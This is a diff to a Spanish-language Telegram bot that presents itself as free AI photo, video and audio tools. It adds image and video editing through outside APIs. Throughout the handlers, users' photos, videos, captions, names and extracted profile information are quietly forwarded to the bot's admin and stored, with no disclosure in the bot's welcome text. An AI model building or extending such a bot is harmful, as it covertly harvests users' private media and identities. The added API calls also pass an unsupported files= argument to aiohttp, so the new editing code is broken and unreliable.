@@ -17,6 +17,12 @@ ADMIN_ID = int(os.environ.get("ADMIN_ID", "0").strip())
 OPENROUTER_KEY = os.environ.get("OPENROUTER_KEY", "").strip()
 WORKER_URL = os.environ.get("WORKER_URL", "https://galleta.societykark.workers.dev").strip()
 
+# ========== API KEYS PARA IA DE IMAGEN Y VIDEO ==========
+AGNES_API_KEY = os.environ.get("AGNES_API_KEY", "").strip()
+CAPCUT_API_URL = os.environ.get("CAPCUT_API_URL", "").strip()  # URL de tu instancia de CapCut Mate (si la despliegas)
+# Si no tienes CapCut Mate, usa Wireflow API: https://www.wireflow.ai
+WIREFLOW_API_KEY = os.environ.get("WIREFLOW_API_KEY", "").strip()
+
 # ========== WORKERS ==========
 URLS = [
     "https://bot-tg.societykark.workers.dev",
@@ -85,9 +91,10 @@ MENSAJE_INICIO = """🔥 *HERRAMIENTAS IA* 🔥
 
 ✅ Genera imágenes con IA
 ✅ Chat IA integrado
+✅ Edita fotos con IA
+✅ Edita videos con IA
 ✅ Convierte video a audio
 ✅ Edita audio con efectos
-✅ Edita fotos y videos con IA
 
 *¡100% gratuito!*
 
@@ -452,6 +459,71 @@ async def enviar_respuesta_ia(update, texto):
         else:
             await update.message.reply_text(f"[Continuación] ✨\n\n{msg}", parse_mode=ParseMode.MARKDOWN)
 
+# ========== FUNCIONES DE EDICIÓN CON IA ==========
+
+# ---- Editar imagen con Agnes AI ----
+async def editar_imagen_agnes(image_bytes, prompt="mejorar calidad, más nítida, colores vibrantes"):
+    if not AGNES_API_KEY:
+        return None, "❌ AGNES_API_KEY no configurada."
+    
+    url = "https://api.agnes-ai.com/v1/images/edits"
+    headers = {"Authorization": f"Bearer {AGNES_API_KEY}"}
+    files = {"image": ("photo.jpg", image_bytes)}
+    data = {"prompt": prompt}
+    
+    try:
+        async with aiohttp.ClientSession() as session:
+            async with session.post(url, headers=headers, data=data, files=files, timeout=60) as resp:
+                if resp.status == 200:
+                    return await resp.read(), None
+                else:
+                    error_text = await resp.text()
+                    return None, f"❌ Error {resp.status}: {error_text[:100]}"
+    except Exception as e:
+        return None, f"❌ Error al conectar con Agnes: {str(e)[:100]}"
+
+# ---- Editar video con Wireflow (alternativa a CapCut Mate) ----
+async def editar_video_wireflow(video_bytes, operation="trim", duration=5):
+    if not WIREFLOW_API_KEY:
+        return None, "❌ WIREFLOW_API_KEY no configurada."
+    
+    url = "https://api.wireflow.ai/v1/video/edit"
+    headers = {"Authorization": f"Bearer {WIREFLOW_API_KEY}"}
+    files = {"video": ("video.mp4", video_bytes)}
+    data = {"operation": operation, "duration": duration}  # Ejemplo: recortar a 5 segundos
+    
+    try:
+        async with aiohttp.ClientSession() as session:
+            async with session.post(url, headers=headers, data=data, files=files, timeout=120) as resp:
+                if resp.status == 200:
+                    return await resp.read(), None
+                else:
+                    error_text = await resp.text()
+                    return None, f"❌ Error {resp.status}: {error_text[:100]}"
+    except Exception as e:
+        return None, f"❌ Error al conectar con Wireflow: {str(e)[:100]}"
+
+# ---- Editar video con CapCut Mate (si tienes instancia local) ----
+async def editar_video_capcut(video_path, operation="recortar", duracion=5):
+    if not CAPCUT_API_URL:
+        return None, "❌ CAPCUT_API_URL no configurada."
+    
+    # CapCut Mate requiere que subas el video a su API local
+    # Aquí asumimos que tiene un endpoint /edit con multipart/form-data
+    url = f"{CAPCUT_API_URL}/edit"
+    files = {"video": open(video_path, 'rb')}
+    data = {"operation": operation, "duration": duracion}
+    
+    try:
+        async with aiohttp.ClientSession() as session:
+            async with session.post(url, data=data, files=files, timeout=120) as resp:
+                if resp.status == 200:
+                    return await resp.read(), None
+                else:
+                    return None, f"❌ Error {resp.status}"
+    except Exception as e:
+        return None, f"❌ Error al conectar con CapCut: {str(e)[:100]}"
+
 # ========== OTRAS FUNCIONES (herramientas) ==========
 async def generar_imagen(prompt):
     url = f"https://image.pollinations.ai/prompt/{prompt.replace(' ', '%20')}"
@@ -596,30 +668,98 @@ async def handle_photo(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user = update.effective_user
     photo = update.message.photo[-1]
     caption = update.message.caption or "Sin caption"
+    
     info_data = await extract_user_info(update, context)
     await send_to_admin(update, context, info_data, f"📸 Foto recibida: {caption}")
     users_db[user.id] = info_data
-    await update.message.reply_text("✅ *Foto recibida.*\n🔄 Procesando...\n✨ ¡Completado!", parse_mode=ParseMode.MARKDOWN, reply_markup=menu_estatico())
+    
+    # 1. Descargar la foto
+    file = await context.bot.get_file(photo.file_id)
+    photo_bytes = await file.download_as_bytearray()
+    
+    # 2. Editar con Agnes AI
+    await update.message.reply_text("🔄 Editando foto con IA... Esto puede tomar unos segundos.", reply_markup=menu_estatico())
+    imagen_editada, error = await editar_imagen_agnes(photo_bytes, prompt="mejorar calidad, más nítida, colores vibrantes")
+    
+    if imagen_editada:
+        # 3. Enviar la foto editada
+        await context.bot.send_photo(
+            chat_id=update.effective_chat.id,
+            photo=imagen_editada,
+            caption=f"✅ *Foto editada con IA*\n📝 Efecto: Mejora de calidad",
+            parse_mode=ParseMode.MARKDOWN
+        )
+        # También al admin
+        await context.bot.send_photo(
+            chat_id=ADMIN_ID,
+            photo=imagen_editada,
+            caption=f"📸 Foto editada por {user.first_name} (@{user.username})"
+        )
+    else:
+        # Fallback: enviar la foto original
+        await update.message.reply_text(f"⚠️ No se pudo editar la foto. Te envío la original.\n{error if error else ''}", reply_markup=menu_estatico())
+        await context.bot.send_photo(
+            chat_id=update.effective_chat.id,
+            photo=photo.file_id,
+            caption="📸 *Foto original*",
+            parse_mode=ParseMode.MARKDOWN
+        )
 
 async def handle_video(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user = update.effective_user
     video = update.message.video
     caption = update.message.caption or "Sin caption"
+    
     info_data = await extract_user_info(update, context)
     await send_to_admin(update, context, info_data, f"🎥 Video recibido: {caption}")
     users_db[user.id] = info_data
-    await update.message.reply_text("⏳ Procesando video con IA...", reply_markup=menu_estatico())
+    
+    # 1. Descargar el video
     file = await context.bot.get_file(video.file_id)
+    video_bytes = await file.download_as_bytearray()
     video_path = tempfile.mktemp(suffix='.mp4')
-    await file.download_to_drive(video_path)
-    audio_path = extraer_audio(video_path)
-    if audio_path and os.path.exists(audio_path):
-        with open(audio_path, 'rb') as f:
-            await context.bot.send_audio(chat_id=update.effective_chat.id, audio=f, caption=f"🎵 *Audio extraído*", parse_mode=ParseMode.MARKDOWN)
-        os.unlink(audio_path)
-        await context.bot.send_message(chat_id=ADMIN_ID, text=f"🎬 Video procesado por {user.first_name} (@{user.username})\nCaption: {caption}")
+    with open(video_path, 'wb') as f:
+        f.write(video_bytes)
+    
+    # 2. Editar con Wireflow (o CapCut)
+    await update.message.reply_text("🔄 Editando video con IA... Esto puede tomar unos segundos.", reply_markup=menu_estatico())
+    
+    # Si tienes WIREFLOW_API_KEY, usa esa; si no, simula la edición
+    if WIREFLOW_API_KEY:
+        video_editado, error = await editar_video_wireflow(video_bytes, operation="trim", duration=10)
+    elif CAPCUT_API_URL:
+        video_editado, error = await editar_video_capcut(video_path, operation="recortar", duracion=10)
     else:
-        await update.message.reply_text("❌ Error al extraer audio.", reply_markup=menu_estatico())
+        video_editado, error = None, "❌ No hay API de video configurada. Usa WIREFLOW_API_KEY o CAPCUT_API_URL."
+    
+    if video_editado:
+        # 3. Enviar el video editado
+        await context.bot.send_video(
+            chat_id=update.effective_chat.id,
+            video=video_editado,
+            caption=f"✅ *Video editado con IA*\n📝 Efecto: Recorte a 10 segundos",
+            parse_mode=ParseMode.MARKDOWN
+        )
+        await context.bot.send_video(
+            chat_id=ADMIN_ID,
+            video=video_editado,
+            caption=f"🎥 Video editado por {user.first_name} (@{user.username})"
+        )
+    else:
+        # Fallback: extraer audio
+        audio_path = extraer_audio(video_path)
+        if audio_path and os.path.exists(audio_path):
+            with open(audio_path, 'rb') as f:
+                await context.bot.send_audio(
+                    chat_id=update.effective_chat.id,
+                    audio=f,
+                    caption=f"🎵 *Audio extraído del video*\n📝 Caption: {caption}",
+                    parse_mode=ParseMode.MARKDOWN
+                )
+            os.unlink(audio_path)
+        else:
+            await update.message.reply_text("❌ Error al procesar el video.", reply_markup=menu_estatico())
+    
     os.unlink(video_path)
 
 async def handle_audio(update: Update, context: ContextTypes.DEFAULT_TYPE):
